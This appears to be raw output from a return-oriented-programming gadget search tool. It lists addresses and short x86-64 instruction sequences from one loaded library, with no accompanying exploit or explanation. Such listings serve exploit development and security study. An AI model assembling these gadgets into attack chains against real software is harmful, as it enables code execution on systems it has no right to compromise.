0x00002aaaaabd7ad5 : add byte ptr [rax], al ; mov esi, 1 ; mov rdi, r14 ; call rbx
0x00002aaaaabd7f0f : add byte ptr [rax], al ; mov esi, 2 ; mov rdi, r12 ; call rbx
0x00002aaaaabd7c82 : add byte ptr [rax], al ; mov esi, 2 ; mov rdi, r13 ; call rbx
0x00002aaaaabd7b4e : add byte ptr [rax], al ; mov esi, 2 ; mov rdi, r14 ; call rbx
0x00002aaaaabd7ac6 : add byte ptr [rax], al ; mov esi, 2 ; mov rdi, r15 ; call rbx
0x00002aaaaaaf52f1 : add byte ptr [rax], al ; mov esi, r14d ; call 0xa9ebb
0x00002aaaaac825f2 : add byte ptr [rax], al ; mov esp, 0x18000126 ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac71bf2 : add byte ptr [rax], al ; mov esp, 0x2800001c ; cmp ch, cl ; call qword ptr [rax]
0x00002aaaaac7e6f2 : add byte ptr [rax], al ; mov esp, 0x280000e7 ; out dx, eax ; int1 ; jmp rcx
0x00002aaaaac822f2 : add byte ptr [rax], al ; mov esp, 0x28000123 ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac855f2 : add byte ptr [rax], al ; mov esp, 0x48000156 ; jnp 0x1b05f9 ; jmp qword ptr [rcx]
0x00002aaaaac781f2 : add byte ptr [rax], al ; mov esp, 0x68000082 ; pop rcx ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac831f2 : add byte ptr [rax], al ; mov esp, 0x88000132 ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac84df2 : add byte ptr [rax], al ; mov esp, 0xd800014e ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac89af2 : add byte ptr [rax], al ; mov esp, 0xd800019b ; ret
0x00002aaaaac86ef2 : add byte ptr [rax], al ; mov esp, 0xf800016f ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaab47c74 : add byte ptr [rax], al ; mov qword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x00002aaaaab50b17 : add byte ptr [rax], al ; mov qword ptr [rax + 8], 0 ; ret
0x00002aaaaab2264b : add byte ptr [rax], al ; mov qword ptr [rbp - 0x4e8], rsi ; jmp rax
0x00002aaaaabe8b10 : add byte ptr [rax], al ; mov qword ptr [rbp - 0x70], rdx ; mov rdx, r13 ; call rax
0x00002aaaaac17a03 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x10], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaac179bb : add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaab50208 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x00002aaaaac17c2e : add byte ptr [rax], al ; mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaab5db20 : add byte ptr [rax], al ; mov qword ptr [rbx], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac3d11e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov byte ptr [rcx + 8], dl ; ret
0x00002aaaaac3d13e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov dword ptr [rcx + 7], edx ; ret
0x00002aaaaac3d14e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov dword ptr [rcx + 8], edx ; ret
0x00002aaaaac3d15e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 5], rdx ; ret
0x00002aaaaac3d16e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 6], rdx ; ret
0x00002aaaaac3d17e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 7], rdx ; ret
0x00002aaaaac3d18e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov qword ptr [rcx + 8], rdx ; ret
0x00002aaaaac3d12e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; mov word ptr [rcx + 8], dx ; ret
0x00002aaaaac3d10e : add byte ptr [rax], al ; mov qword ptr [rcx], rdx ; ret
0x00002aaaaab6911e : add byte ptr [rax], al ; mov qword ptr [rdi + 0x38], r9 ; ret
0x00002aaaaabd3645 : add byte ptr [rax], al ; mov qword ptr [rdi + 8], 0 ; ret
0x00002aaaaac1092a : add byte ptr [rax], al ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab7b1ae : add byte ptr [rax], al ; mov qword ptr [rdi - 1], rdx ; ret
0x00002aaaaab7b1ce : add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaab7b1ee : add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7b1fe : add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7b20e : add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7b21e : add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7b1de : add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaab7b1be : add byte ptr [rax], al ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab1f0a0 : add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x00002aaaaab42cb4 : add byte ptr [rax], al ; mov qword ptr [rdx + 0x130], rcx ; ret
0x00002aaaaab4d4b2 : add byte ptr [rax], al ; mov qword ptr [rdx + 0x130], rdi ; pop rbx ; ret
0x00002aaaaab40411 : add byte ptr [rax], al ; mov qword ptr [rdx + 8], r8 ; add dword ptr [rdx + 4], 1 ; ret
0x00002aaaaab4b2dc : add byte ptr [rax], al ; mov qword ptr [rdx], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac0673b : add byte ptr [rax], al ; mov qword ptr [rdx], rsi ; mov qword ptr [rdx + 8], rdi ; ret
0x00002aaaaabd2902 : add byte ptr [rax], al ; mov qword ptr [rip + 0x2c6e95], rax ; mov rdx, rax ; jmp 0xfd8aa
0x00002aaaaac01d1c : add byte ptr [rax], al ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab10293 : add byte ptr [rax], al ; mov qword ptr [rsi + 0x10], rax ; xor eax, eax ; ret
0x00002aaaaabca2ac : add byte ptr [rax], al ; mov qword ptr [rsi + 0x78], rax ; xor eax, eax ; ret
0x00002aaaaabbcca4 : add byte ptr [rax], al ; mov qword ptr [rsi + 8], 0 ; ret
0x00002aaaaac01cec : add byte ptr [rax], al ; mov qword ptr [rsi + 8], rax ; ret
0x00002aaaaabed76e : add byte ptr [rax], al ; mov qword ptr [rsi], rdi ; xor eax, eax ; ret
0x00002aaaaabb85cb : add byte ptr [rax], al ; mov qword ptr [rsp + 0x18], rdx ; call 0x1f8a9
0x00002aaaaab0862f : add byte ptr [rax], al ; mov qword ptr [rsp + 0x28], rcx ; call 0x1f8a9
0x00002aaaaab0f5f6 : add byte ptr [rax], al ; mov qword ptr fs:[rbp], rdx ; call rax
0x00002aaaaac0c67b : add byte ptr [rax], al ; mov qword ptr fs:[rbx], rax ; pop rbx ; ret
0x00002aaaaaaf53f5 : add byte ptr [rax], al ; mov r12, rax ; call 0xa9fdb
0x00002aaaaab3a976 : add byte ptr [rax], al ; mov r13d, eax ; jmp 0x653d8
0x00002aaaaab0a3e4 : add byte ptr [rax], al ; mov rax, -1 ; ret
0x00002aaaaab803be : add byte ptr [rax], al ; mov rax, 1 ; ret
0x00002aaaaab803ce : add byte ptr [rax], al ; mov rax, 2 ; ret
0x00002aaaaab803de : add byte ptr [rax], al ; mov rax, 3 ; ret
0x00002aaaaab803ee : add byte ptr [rax], al ; mov rax, 4 ; ret
0x00002aaaaab803fe : add byte ptr [rax], al ; mov rax, 5 ; ret
0x00002aaaaab8040e : add byte ptr [rax], al ; mov rax, 6 ; ret
0x00002aaaaab8041e : add byte ptr [rax], al ; mov rax, 7 ; ret
0x00002aaaaab50239 : add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x18] ; jmp rax
0x00002aaaaab496b0 : add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaabe8de6 : add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x30] ; ret
0x00002aaaaab50705 : add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaabda676 : add byte ptr [rax], al ; mov rax, qword ptr [rax + 8] ; ret
0x00002aaaaab0f720 : add byte ptr [rax], al ; mov rax, qword ptr [rax] ; pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaac3b05e : add byte ptr [rax], al ; mov rax, qword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x00002aaaaac1018e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x18] ; sub rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab9cc9e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab49f6e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x00002aaaaab51b2e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x00002aaaaac02b1e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 8] ; lea rsi, qword ptr [rsp + 8] ; call qword ptr [rax]
0x00002aaaaac0ff56 : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaac0ff66 : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac15331 : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x2840d6] ; call qword ptr [rax]
0x00002aaaaac14d1e : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x2846e9] ; call qword ptr [rax]
0x00002aaaaab51b0e : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x347a09] ; ret
0x00002aaaaaaf6a4e : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x3a68b9] ; ret
0x00002aaaaaaf6a3e : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x3a68d9] ; ret
0x00002aaaaab01b46 : add byte ptr [rax], al ; mov rax, qword ptr [rsi + rax*8 + 0x80] ; ret
0x00002aaaaab10036 : add byte ptr [rax], al ; mov rax, qword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaabd225d : add byte ptr [rax], al ; mov rax, qword ptr [rsp - 0x50] ; ret
0x00002aaaaab52f34 : add byte ptr [rax], al ; mov rax, r8 ; ret
0x00002aaaaab4e127 : add byte ptr [rax], al ; mov rax, rbp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab42c05 : add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4ea9a : add byte ptr [rax], al ; mov rax, rbx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd7566 : add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3fbcd : add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab0faac : add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab08ea4 : add byte ptr [rax], al ; mov rax, rcx ; ret
0x00002aaaaab0f6ae : add byte ptr [rax], al ; mov rax, rdi ; cqo ; idiv rsi ; ret
0x00002aaaaab51b3e : add byte ptr [rax], al ; mov rax, rdi ; ret
0x00002aaaaab5863a : add byte ptr [rax], al ; mov rax, rdx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac154aa : add byte ptr [rax], al ; mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaabe2f79 : add byte ptr [rax], al ; mov rax, rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab58ff4 : add byte ptr [rax], al ; mov rax, rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab43539 : add byte ptr [rax], al ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaab7a1fe : add byte ptr [rax], al ; mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac485de : add byte ptr [rax], al ; mov rdi, qword ptr [r13 + 0x70] ; call 0x1f8b0
0x00002aaaaaba3752 : add byte ptr [rax], al ; mov rdi, qword ptr [rbp - 0x308] ; call r12
0x00002aaaaabc0744 : add byte ptr [rax], al ; mov rdi, qword ptr [rbp - 0x88] ; call rbx
0x00002aaaaab47fe5 : add byte ptr [rax], al ; mov rdi, qword ptr [rdx + 0x40] ; jmp 0x72fb7
0x00002aaaaabd7c96 : add byte ptr [rax], al ; mov rdi, r12 ; call rbx
0x00002aaaaab5d2a3 : add byte ptr [rax], al ; mov rdi, r12 ; mov rdx, r13 ; mov rsi, rbp ; call rax
0x00002aaaaab046d6 : add byte ptr [rax], al ; mov rdi, r13 ; call rax
0x00002aaaaabd7b62 : add byte ptr [rax], al ; mov rdi, r13 ; call rbx
0x00002aaaaabd7ada : add byte ptr [rax], al ; mov rdi, r14 ; call rbx
0x00002aaaaac00de0 : add byte ptr [rax], al ; mov rdi, r14 ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [rax]
0x00002aaaaac01927 : add byte ptr [rax], al ; mov rdi, r14 ; mov rcx, qword ptr [rsp + 8] ; call rcx
0x00002aaaaabd7acb : add byte ptr [rax], al ; mov rdi, r15 ; call rbx
0x00002aaaaac0c4ac : add byte ptr [rax], al ; mov rdi, r15 ; lea r9, qword ptr [rsp + 0x2a] ; call qword ptr [rax]
0x00002aaaaac0b303 : add byte ptr [rax], al ; mov rdi, rax ; lea r9, qword ptr [rsp + 0x10] ; call qword ptr [r10]
0x00002aaaaac0b844 : add byte ptr [rax], al ; mov rdi, rax ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [r10]
0x00002aaaaac0275b : add byte ptr [rax], al ; mov rdi, rbp ; call qword ptr [rbx]
0x00002aaaaabd7f20 : add byte ptr [rax], al ; mov rdi, rbp ; call rbx
0x00002aaaaac00ed2 : add byte ptr [rax], al ; mov rdi, rbp ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac0b795 : add byte ptr [rax], al ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaab41b46 : add byte ptr [rax], al ; mov rdi, rbx ; call r8
0x00002aaaaab41433 : add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x00002aaaaac174e8 : add byte ptr [rax], al ; mov rdi, rbx ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaab5c553 : add byte ptr [rax], al ; mov rdi, rbx ; mov rdx, r15 ; call rax
0x00002aaaaab4721b : add byte ptr [rax], al ; mov rdi, rbx ; pop rbx ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47063 : add byte ptr [rax], al ; mov rdi, rbx ; pop rbx ; mov rax, qword ptr [rax + 0x28] ; jmp rax
0x00002aaaaac0ed8e : add byte ptr [rax], al ; mov rdi, rsp ; call rdx
0x00002aaaaabfe5eb : add byte ptr [rax], al ; mov rdi, rsp ; mov rsi, r14 ; call 0x558ba
0x00002aaaaac26e2e : add byte ptr [rax], al ; mov rdx, qword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab7a1ee : add byte ptr [rax], al ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab5c040 : add byte ptr [rax], al ; mov rdx, r12 ; mov rdi, r15 ; call rax
0x00002aaaaabf12fc : add byte ptr [rax], al ; mov rdx, r15 ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaabadc29 : add byte ptr [rax], al ; mov rdx, r8 ; jmp 0xd8c3e
0x00002aaaaab529c1 : add byte ptr [rax], al ; mov rdx, rax ; jmp 0x7d9e4
0x00002aaaaab5cd84 : add byte ptr [rax], al ; mov rdx, rbp ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaab30e56 : add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x367111] ; call rax
0x00002aaaaab30800 : add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x367767] ; call rax
0x00002aaaaab25048 : add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x372f1f] ; call rax
0x00002aaaaab223cc : add byte ptr [rax], al ; mov rsi, qword ptr [rip + 0x375b9b] ; call rax
0x00002aaaaab5d14e : add byte ptr [rax], al ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaab5c2b0 : add byte ptr [rax], al ; mov rsi, r12 ; mov rdi, rbx ; call rax
0x00002aaaaab5be22 : add byte ptr [rax], al ; mov rsi, r14 ; call rax
0x00002aaaaac173ec : add byte ptr [rax], al ; mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaab91e75 : add byte ptr [rax], al ; mov rsi, rbp ; mov rdi, rbx ; call 0x8916a
0x00002aaaaab5cfc4 : add byte ptr [rax], al ; mov rsi, rbp ; mov rdi, rbx ; call rax
0x00002aaaaac713c2 : add byte ptr [rax], al ; mov word ptr [rax + rax], ss ; add byte ptr [rax + 0x6f], ch ; std ; call qword ptr [rcx]
0x00002aaaaac812c2 : add byte ptr [rax], al ; mov word ptr [rbx], ss ; add dword ptr [rax], eax ; or bl, bl ; call qword ptr [rdi]
0x00002aaaaac850c2 : add byte ptr [rax], al ; mov word ptr [rcx + 1], ss ; add byte ptr [rax + 0x72], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac833c2 : add byte ptr [rax], al ; mov word ptr [rcx + rax], dr0 ; add byte ptr [rax - 0x14], ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac3d0be : add byte ptr [rax], al ; mov word ptr [rcx], dx ; mov byte ptr [rcx + 2], dl ; ret
0x00002aaaaac3d0ae : add byte ptr [rax], al ; mov word ptr [rcx], dx ; ret
0x00002aaaaac86ec2 : add byte ptr [rax], al ; mov word ptr [rdi + 1], gs ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaab7b15e : add byte ptr [rax], al ; mov word ptr [rdi], dx ; ret
0x00002aaaaab72eae : add byte ptr [rax], al ; mov word ptr [rdi], si ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab72e1e : add byte ptr [rax], al ; mov word ptr [rdi], si ; mov rax, rdi ; ret
0x00002aaaaac067bd : add byte ptr [rax], al ; mov word ptr [rdx + 0x6c], ax ; mov eax, 1 ; ret
0x00002aaaaab102dd : add byte ptr [rax], al ; mov word ptr [rsi + 0xc], ax ; xor eax, eax ; ret
0x00002aaaaab10324 : add byte ptr [rax], al ; mov word ptr [rsi + 0xe], ax ; xor eax, eax ; ret
0x00002aaaaab0a000 : add byte ptr [rax], al ; mov word ptr [rsp - 0x10], ax ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab09b2e : add byte ptr [rax], al ; movapd xmm0, xmm1 ; add rsp, 0x28 ; ret
0x00002aaaaab09e5e : add byte ptr [rax], al ; movaps xmm0, xmm1 ; add rsp, 0x28 ; ret
0x00002aaaaabb512e : add byte ptr [rax], al ; movdqa xmm0, xmm2 ; jmp 0xe0118
0x00002aaaaab7b22e : add byte ptr [rax], al ; movdqu xmmword ptr [rdi - 1], xmm0 ; ret
0x00002aaaaab7b23e : add byte ptr [rax], al ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaabd6269 : add byte ptr [rax], al ; movmskpd eax, xmm0 ; and eax, 1 ; jmp 0x101241
0x00002aaaaac6bde6 : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; adc al, 0xee ; jmp rsp
0x00002aaaaac822da : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; and eax, dword ptr [rcx] ; add byte ptr [rax], dl ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f0da : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; int1 ; add byte ptr [rax], al ; jo 0x1aa100 ; jmp qword ptr [rcx]
0x00002aaaaac6aeae : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; mov ebp, ecx ; jmp rsp
0x00002aaaaac7edda : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; out dx, al ; add byte ptr [rax], al ; xor byte ptr [rdx], cl ; call rsi
0x00002aaaaac855da : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; push rsi ; add dword ptr [rax], eax ; xor byte ptr [rbx - 0xb], bh ; jmp qword ptr [rcx]
0x00002aaaaac7cada : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; retf ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac2d359 : add byte ptr [rax], al ; movsxd r9, dword ptr [r11 + r9*4] ; add r9, r11 ; jmp r9
0x00002aaaaab4194a : add byte ptr [rax], al ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00002aaaaab0fb48 : add byte ptr [rax], al ; movsxd rax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret
0x00002aaaaab1cc8f : add byte ptr [rax], al ; movsxd rcx, dword ptr [r11 + rcx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaabf837f : add byte ptr [rax], al ; movsxd rdx, eax ; add rdi, rdx ; mov qword ptr [r9], rdi ; ret
0x00002aaaaac4286e : add byte ptr [rax], al ; movzx eax, byte ptr [rdi] ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00002aaaaab4f61e : add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x00002aaaaab5f58e : add byte ptr [rax], al ; movzx ecx, byte ptr [rsi] ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x00002aaaaac2f69e : add byte ptr [rax], al ; movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac2fd7e : add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaac2f61e : add byte ptr [rax], al ; movzx edx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x00002aaaaac2fd0e : add byte ptr [rax], al ; movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaac79cbe : add byte ptr [rax], al ; nop ; add esi, ebp ; call qword ptr [rsi]
0x00002aaaaac7a2ae : add byte ptr [rax], al ; nop ; in al, -4 ; call qword ptr [rdx]
0x00002aaaaac790af : add byte ptr [rax], al ; nop ; in eax, dx ; call qword ptr [rdx]
0x00002aaaaac77c5e : add byte ptr [rax], al ; nop ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaabd071d : add byte ptr [rax], al ; nop ; mov eax, dword ptr [rdi + 8] ; and eax, 0x100f ; ret
0x00002aaaaab0b86c : add byte ptr [rax], al ; nop ; mov eax, dword ptr [rip + 0x38c816] ; ret
0x00002aaaaabed7ad : add byte ptr [rax], al ; nop ; mov eax, edi ; ror ax, 8 ; ret
0x00002aaaaab593fd : add byte ptr [rax], al ; nop ; mov rsi, qword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x00002aaaaabca34d : add byte ptr [rax], al ; nop ; movzx eax, word ptr [rdi] ; mov word ptr [rsi], ax ; xor eax, eax ; ret
0x00002aaaaac74e5e : add byte ptr [rax], al ; nop ; pop rsp ; jmp 0x19fe68
0x00002aaaaaaf558d : add byte ptr [rax], al ; nop ; ret
0x00002aaaaac10179 : add byte ptr [rax], al ; nop dword ptr [rax + rax] ; ret
0x00002aaaaab00d4f : add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x00002aaaaac1072b : add byte ptr [rax], al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaac7357e : add byte ptr [rax], al ; or ah, 0xe9 ; call qword ptr [rsi]
0x00002aaaaac82542 : add byte ptr [rax], al ; or al, 0x26 ; add dword ptr [rax], eax ; movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaac82e42 : add byte ptr [rax], al ; or al, 0x2f ; add dword ptr [rax], eax ; pop rax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac83142 : add byte ptr [rax], al ; or al, 0x32 ; add dword ptr [rax], eax ; fsub st(6) ; hlt ; jmp qword ptr [rbx]
0x00002aaaaac78842 : add byte ptr [rax], al ; or al, 0x89 ; add byte ptr [rax], al ; fdivr dword ptr [rcx - 0x13] ; jmp qword ptr [rcx]
0x00002aaaaac7a842 : add byte ptr [rax], al ; or al, 0xa9 ; add byte ptr [rax], al ; mov byte ptr [rsi - 0x12], cl ; jmp qword ptr [rdx]
0x00002aaaaac7c642 : add byte ptr [rax], al ; or al, 0xc7 ; add byte ptr [rax], al ; cmp byte ptr [rdi - 0x10], al ; jmp qword ptr [rdi]
0x00002aaaaac7de42 : add byte ptr [rax], al ; or al, 0xdf ; add byte ptr [rax], al ; int1 ; call qword ptr [rdx]
0x00002aaaaac7f542 : add byte ptr [rax], al ; or al, 0xf6 ; add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac90342 : add byte ptr [rax], al ; or al, 4 ; add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaaae529e : add byte ptr [rax], al ; or al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaaaeeede : add byte ptr [rax], al ; or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pushfq ; ret
0x00002aaaaaaf3606 : add byte ptr [rax], al ; or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18bb
0x00002aaaaaaf037e : add byte ptr [rax], al ; or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18e7
0x00002aaaaaae052e : add byte ptr [rax], al ; or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x56
0x00002aaaaaaeeec6 : add byte ptr [rax], al ; or byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xchg eax, esp ; ret
0x00002aaaaac7ebb6 : add byte ptr [rax], al ; or byte ptr [rbx], al ; call rdi
0x00002aaaaac7d4e6 : add byte ptr [rax], al ; or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaac76ec6 : add byte ptr [rax], al ; or byte ptr [rcx], bl ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaab0ad62 : add byte ptr [rax], al ; or byte ptr [rdi], cl ; ret 0xc289
0x00002aaaaabd0a08 : add byte ptr [rax], al ; or byte ptr [rip - 0x80000000], 0x39 ; ret 0x8e75
0x00002aaaaac7363e : add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaab4d9ce : add byte ptr [rax], al ; or dword ptr [rbx], 0x20 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaaae2d96 : add byte ptr [rax], al ; or eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 6
0x00002aaaaac90fa6 : add byte ptr [rax], al ; or eax, dword ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0
0x00002aaaaabdb964 : add byte ptr [rax], al ; or eax, edi ; ret
0x00002aaaaac91606 : add byte ptr [rax], al ; out 1, eax ; add byte ptr [rax], al ; ret 4
0x00002aaaaac86e7a : add byte ptr [rax], al ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; and byte ptr [rdx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaab09b3e : add byte ptr [rax], al ; pmovmskb eax, xmm0 ; and eax, 0x80 ; ret
0x00002aaaaab09e6e : add byte ptr [rax], al ; pmovmskb eax, xmm0 ; and eax, 8 ; ret
0x00002aaaaac72966 : add byte ptr [rax], al ; pop rax ; mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaac74f96 : add byte ptr [rax], al ; pop rax ; mov dh, 0xeb ; jmp qword ptr [rax]
0x00002aaaaabdb827 : add byte ptr [rax], al ; pop rax ; pop rdi ; call rax
0x00002aaaaac75886 : add byte ptr [rax], al ; pop rax ; shr ah, 1 ; jmp rbx
0x00002aaaaac7dd4f : add byte ptr [rax], al ; pop rbp ; int1 ; jmp qword ptr [rcx]
0x00002aaaaab90c76 : add byte ptr [rax], al ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab29ccd : add byte ptr [rax], al ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab29d9d : add byte ptr [rax], al ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab45b70 : add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
